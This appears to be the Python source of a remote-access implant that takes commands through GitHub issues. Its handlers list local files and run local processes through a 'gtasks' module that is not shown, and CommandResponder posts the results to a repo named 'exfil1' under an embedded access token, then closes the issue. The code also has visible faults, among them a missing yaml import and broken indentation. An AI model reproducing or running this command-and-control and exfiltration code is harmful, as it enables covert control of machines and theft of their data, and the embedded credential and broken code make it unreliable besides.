from yaml import dump
import threading, importlib
from github import Github

class CommandResponder:
	
	def __init__(self,agentid, issue ):
		self.agentid=agentid
		self.issue=issue

		self.task_data=""
		self.ghuser_name="drtkn"
		self.ghtoken="dbba5bd20be0a59543762bd19e881d351ce118c7"
		self.ghrepo_name="exfil1"
		self.gh = Github(self.ghuser_name, self.ghtoken)
		self.ghuser = self.gh.get_user()
		self.ghrepo=self.ghuser.get_repo(self.ghrepo_name)
		self.ghissue=self.ghrepo.get_issue(self.issue)

	def _recordData(self):
		pass	

	def setData(self, task_data):
		self.task_data=task_data
		print("CommandResponder: Uploading data {} for agent {} to GH (notify issue {} )".format(
				self.task_data, self.agentid, self.issue))
		self.commentIssue()
		self.closeIssue()

	def commentIssue(self):
		self.ghissue.create_comment(self.task_data)
		print("CommandResponder: Comment made on Issue")

	def closeIssue(self):
		self.ghissue.edit(state="closed")
		print("CommandResponder: Issue closed ")
			

class CommandRouter:
	def __init__(self, task, agentid, issue, data):
		self.task=task
		self.data=data
		self.responder=CommandResponder(agentid,issue)		

	def run(self):
		task_switcher = {
			"get_local_file_list": "FileTask",
			"exec_local_process": "ExecLProcessTask"
		}
		module = importlib.import_module("gtasks")
		task = getattr(module, str(task_switcher.get(self.task)))
		itask = task(self.responder, self.data)	

		itask.execute()

class CommandParser:

	def __init__(self,agentid,issue):
		self.agentid=agentid
		self.issue=issue

	def parse(self, request):

		if 'request' in request:
			print("CommandParser: Request received {}".format(request['request']))
	 		if len(request['request']) == 0 or len(request['request']) > 10:
					print("CommandParser: number of commands in request needs to be 1...10")
			else:		
				for command in request['request']:
					print(command)
					cmd_switcher = {
						'getlocal': 'getlocal',
						'getremote': 'getremote',
						'execlocal': 'execlocal'
					}
					cmd = cmd_switcher.get(command.keys()[0], "nosuchcommand")
					getattr(CommandParser(self.agentid,self.issue), str(cmd))(command)
		else:
			print("CommandParser: Invalid request")
			print(yaml.dump(request))

	def getlocal(self, command):
		cmd_params=command[CommandParser.getlocal.__name__]
		print("CommandParser: Executing Local get: {}".format( cmd_params ))
		# {'resource': 'file', 'method': 'list', 'location': 'hello.txt'}}
		if 'resource' in cmd_params:
			res_switcher = {
  				'file': 'r_file'
			}
			cmd = res_switcher.get(cmd_params['resource'], "nosuchresource")
			getattr(CommandParser(self.agentid,self.issue), str(cmd))(cmd_params)
		else:
			print("CommandParser: No resource specified: {}".format(cmd_params))
				
		
	def getremote(self, command):
		print("CommandParser: Executing Remote get: {}".format(command))


	def nosuchcommand(self, command):
		print("CommandParser: No such command {}".format(command))

	def nosuchresource(self, command):
		print("CommandParser: No such resource {}".format(command))

	def nosuchfilemethod(self, command):
		print("CommandParser: No such file method {}".format(command))

	def r_file(self, cmd_params):
		#{'getlocal': {'resource': 'file', 'method': 'listdir', 'location': '/tmp'}}
		print("CommandParser: Executing Local get -> file : {}".format(cmd_params))
		if 'method' in cmd_params:
			met_switcher = {
  				'listdir': 'm_listdir',
  				'list': 'm_list'
			}
			cmd = met_switcher.get(cmd_params['method'], "nosuchfilemethod")
			getattr(CommandParser(self.agentid,self.issue), str(cmd))(cmd_params)
		else:
			print("CommandParser: No method specified: {}".format(cmd_params))

	def m_listdir(self, cmd_params):
		#{'getlocal': {'resource': 'file', 'method': 'listdir', 'location': '/tmp'}}
		print("CommandParser: Executing Local get -> file -> listdir{}".format(cmd_params))

	def m_list(self, cmd_params):
		#{'getlocal': {'resource': 'file', 'method': 'list', 'location': '*.txt'}}
		print("CommandParser: Executing Local get -> file -> list{}".format(cmd_params))
		if 'location' in cmd_params:
			crouter = CommandRouter('get_local_file_list', self.agentid, self.issue, cmd_params)
			thread = threading.Thread(target=crouter.run)
			thread.start()
		else:
			print("CommandParser: No method specified: {}".format(cmd_params))


	def execlocal(self, command):
		print("CommandParser: Executing Local exec: {}".format(command))
		cmd_params=command[CommandParser.execlocal.__name__]
		if 'resource' in cmd_params:
			res_switcher = {
  				'process': 'c_execlocal'
			}
			cmd = res_switcher.get(cmd_params['resource'], "nosuchresource")
			getattr(CommandParser(self.agentid,self.issue), str(cmd))(cmd_params)
		else:
			print("CommandParser: No resource specified: {}".format(cmd_params))

	def c_execlocal(self, cmd_params):
		print("CommandParser: Executing Local exec -> process: {}".format(cmd_params))
		if 'command' in cmd_params:
			crouter = CommandRouter('exec_local_process', self.agentid, self.issue, cmd_params)
			thread = threading.Thread(target=crouter.run)
			thread.start()
		else:
			print("CommandParser: No method specified: {}".format(cmd_params))



















